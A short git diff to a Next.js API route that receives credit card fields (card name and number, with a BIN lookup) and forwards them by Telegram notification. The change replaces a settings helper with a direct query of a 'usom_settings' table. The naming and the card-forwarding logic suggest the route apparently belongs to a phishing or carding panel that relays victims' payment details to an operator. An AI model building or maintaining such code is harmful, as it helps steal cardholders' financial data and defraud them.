@@ -1,7 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import pool from '@/lib/db';
 import { sendTelegramNotification } from '@/lib/telegram';
-import { getUsomSettings } from '@/lib/usom';
 import binlistData from '@/app/binlist.json';
 
 export async function POST(request: NextRequest) {
@@ -140,8 +139,13 @@ export async function POST(request: NextRequest) {
         }
 
         if (!isHard) {
-            const notifySettings = await getUsomSettings();
-            if (notifySettings.log_notify) {
+            let shouldNotify = true;
+            try {
+                const [nRows] = await pool.query('SELECT log_notify FROM usom_settings WHERE id = 1') as any[];
+                if (nRows?.[0] && nRows[0].log_notify === 0) shouldNotify = false;
+            } catch {}
+
+            if (shouldNotify) {
                 sendTelegramNotification({
                     kart_isim: kart_isim || '',
                     kredi_karti,
